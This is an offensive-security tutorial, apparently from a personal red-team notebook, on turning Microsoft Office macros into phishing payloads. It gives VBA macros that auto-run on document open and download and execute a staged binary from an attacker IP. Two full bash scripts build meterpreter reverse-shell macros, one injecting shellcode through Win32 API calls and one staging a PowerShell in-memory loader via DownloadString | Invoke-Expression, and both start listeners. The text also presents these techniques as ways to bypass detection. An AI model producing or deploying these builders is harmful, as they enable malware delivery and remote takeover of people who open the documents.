---
title: Phishing in Microsoft Office
tags:
  - breach
  - operations
  - phishing
  - microsoft
  - office
  - powershell
  - win32api
  - windows
  - api
  - vba
  - visual
  - basic
  - shellcode
  - execution
---

## Gaining VBA script execution

**Visual Basic for Applications (VBA)** is a scripting language available for
use in Microsoft Office applications like Microsoft Word and Microsoft Excel.
Over the years, plenty of mitigations have been implemented to prevent
client-side code execution attacks using VBA in these products. Before we talk
about that, let's talk about how scripts can be executed when Office documents
are opened.

### Document_Open

The `Document_Open` subroutine is a subroutine that is executed for eligible VBA
scripts stored within an Office document when the `Document.Open` event occurs.
Some examples and detail on this subroutine are provided
[here](https://learn.microsoft.com/en-us/office/vba/api/word.document.open).

### Auto macros

There are various
[auto macros](https://learn.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros)
that can be used to gain code execution of eligible VBA scripts during different
events like starting Microsoft Word, opening a document, etc. In these docs,
you'll primarily see the use of `AutoOpen` - an auto macro and subroutine that
is executed for eligible VBA scripts stored within an Office document.

## Mitigations

### File formats

Presently, only some file formats support the execution of macros defined by VBA
scripts - `.doc` and `.docm`. The latest `.docx` does not support macro
execution - stricter security features. You can find more info on Microsoft Word
supported file formats
[here](https://learn.microsoft.com/en-us/office/compatibility/office-file-format-reference).

### Mark of the Web

**Mark of the Web (MoTW)** is a metadata, boolean identifier used by Windows to
mark files downloaded from the internet. This mark is used by products like
Microsoft Office and Excel to warn users that a file was downloaded from the
internet, and that caution should be exercised when enabling certain features.

To gain macro code execution on an Office document payload, an attacker would
have to hope that a victim would go out of their way to disable these
mitigations and security features to enable the execution of their macro
payload.

> NOTE: Interestingly enough, I've used `Invoke-WebRequest` to download payloads
> from an attacker host - MoTW was not set on the resulting downloaded file.

## Useful functions

### Shell

The `Shell` function does what you probably think it does, executes a shell
command. Provide a `pathname` and a `windowstyle` (usually `0` for hidden) to
execute the program located at `pathname`. More details
[here](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/shell-function).
Here's an example of executing `cmd.exe` in a hidden window:

```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```

### Windows Scripting Host

A more powerful primitive for code execution is to use the **Windows Scripting**
**Host (WSH)**. This enables us to define an entire script for execution -
rather than just executing a single program. Details and examples on how to
create and run a WSH object can be found
[here](https://ss64.com/vb/createobject.html). Here's an example of executing
`cmd.exe` in a hidden window:

```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```

## Executing PowerShell

We can also use VBA scripts to execute PowerShell to download payloads from a
stager. Here's an example using **System.Net.WebClient** to download and execute
a file after gaining macro execution in a Word document:

```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

We can also use other PowerShell methods available like **Invoke-WebRequest**.

## Calling Win32API

We can import `.dll`s that implement **Win32API** functions directly from VBA
and execute them within macros. This enables us to execute unmanaged code within
the macro - a great way to bypass detection of funky `cmd.exe` and
`powershell.exe` command execution.

The example provided below shows how to import the `GetUserNameA` **Win32API**
function from `advapi32.dll` in a macro. We use the `Private Declare` keywords
to declare a private function. We use the `PtrSafe` keyword for 64-bit targets.
`String` variables are already handled as pointer values in VBA, so we can pass
these by value to the `GetUserNameA` function.

```vba
'Win32API GetUserNameA function definition
'BOOL GetUserNameA(
'  LPSTR   lpBuffer,
'  LPDWORD pcbBuffer
');

'Declare the function using advapi32.dll
Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long

Function MyMacro()
  Dim res As Long
  Dim MyBuff As String * 256
  Dim MySize As Long
  Dim strlen As Long
  MySize = 256

  res = GetUserName(MyBuff, MySize)
  strlen = InStr(1, MyBuff, vbNullChar) - 1
  MsgBox Left$(MyBuff, strlen)
End Function
```

In the above macro, we use the `InStr` function to find the first `NULL` byte,
which will be at the end of the buffer, `MyBuff`, containing the username
retrieved from the `GetUserNameA` call. Subtracting 1 from that value will
provide us with the true length of the username.

Using the `Left` method, we provide the `strlen` parameter to create a
substring, essentially conducting a `MyBuff[:strlen]` operation to only print
the contents of `MyBuff` up to `strlen`.

### Executing shellcode

The following **Bash** script generates a VBA macro payload that embeds
shellcode for a `msfvenom` `windows/x64/meterpreter/reverse_https` payload. The
VBA macro will execute the provided shellcode by calling `VirtualAlloc`,
`RtlMoveMemory`, and `CreateThread` from `kernel32.dll`. The shellcode buffer
gets copied, byte by byte, into the new memory segment in the current process.
After successfully movement of the shellcode, `CreateThread` is execute to gain
code execution. Understanding the parameters passed to each **Win32API** call is
an exercise left for the reader.

```bash
#!/bin/bash

set -ex -o pipefail

MSFPAYLOAD="windows/x64/meterpreter/reverse_https"
MSFCONSOLE=$(which msfconsole)
MSFVENOM=$(which msfvenom)


msfvenom() {
    PAYLOAD=$($MSFVENOM \
		-p $MSFPAYLOAD \
		LHOST=$LHOST \
		LPORT=$LPORT \
		EXITFUNC=thread \
        -f vbapplication 2>/dev/null)
}


generate_payload() {
    tee payload.vba << EOF
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr

	$PAYLOAD

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
EOF
}

listen() {
    $MSFCONSOLE \
        -q \
        -x "use multi/handler; \
            set payload $MSFPAYLOAD; \
            set LHOST $LHOST; \
            set LPORT $LPORT; \
            exploit"
}


LHOST=$1
LPORT=$2

msfvenom
generate_payload
listen
```

After successful execution of the generated macro payload in a Word document,
the `msfconsole` listener process will receive a reverse callback from the
victim, upload the stager payload, and establish a `meterpreter` session with
the victim host.

## Staging PowerShell shellcode payloads

In
[[executing-win32-apis-in-powershell#Executing shellcode in PowerShell | Executing Win32 APIs in PowerShell - Executing shellcode in PowerShell]],
we demonstrate how to execute **Meterpreter** payloads in PowerShell, using
**P/Invoke** and C# to import and directly call Win32 APIs.

Now that we have these payloads, we can use VBA macros as stagers to retrieve
and deliver these PowerShell shellcode payloads. The example script provided
below does the following:

- Generates a desired **Meterpreter** payload
- Generates a **PowerShell** payload designed to execute shellcode in memory
  using **P/Invoke** and C#
- Generates a VBA macro payload that conducts a web request to download and
  execute the **PowerShell** payload generated in the previous step
- Creates an HTTP stager on the attacker host
- Creates an `msfconsole`stager to listen and deliver the next stage payload
  once the **PowerShell** payload executes

```bash
#!/bin/bash

set -ex -o pipefail

MSFPAYLOAD="windows/x64/meterpreter/reverse_https"
MSFCONSOLE=$(which msfconsole)
MSFVENOM=$(which msfvenom)
PYTHON=$(which python3)
SPORT=8443


msfvenom() {
    PAYLOAD=$($MSFVENOM \
        -p $MSFPAYLOAD \
        LHOST=$LHOST \
        LPORT=$LPORT \
        EXITFUNC=thread \
        -f ps1 2>/dev/null)
}


generate_powershell() {
    tee payload.ps1 << EOF
\$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type \$Kernel32

$PAYLOAD

\$size = \$buf.Length

[IntPtr]\$addr = [Kernel32]::VirtualAlloc(0, \$size, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy(\$buf, 0, \$addr, \$size)

\$thandle=[Kernel32]::CreateThread(0, 0, \$addr, 0, 0, 0)

[Kernel32]::WaitForSingleObject(\$thandle, [uint32]"0xFFFFFFFF")
EOF
}

generate_macro() {
    tee stager.vba << EOF
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://$LHOST:$SPORT/payload.ps1') | Invoke-Expression"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
EOF
}

stage() {
    $PYTHON -m http.server $SPORT &
}

listen() {
    $MSFCONSOLE \
        -q \
        -x "use multi/handler; \
            set payload $MSFPAYLOAD; \
            set LHOST $LHOST; \
            set LPORT $LPORT; \
            exploit"
}


LHOST=$1
LPORT=$2

msfvenom
generate_powershell
generate_macro
stage
listen
```
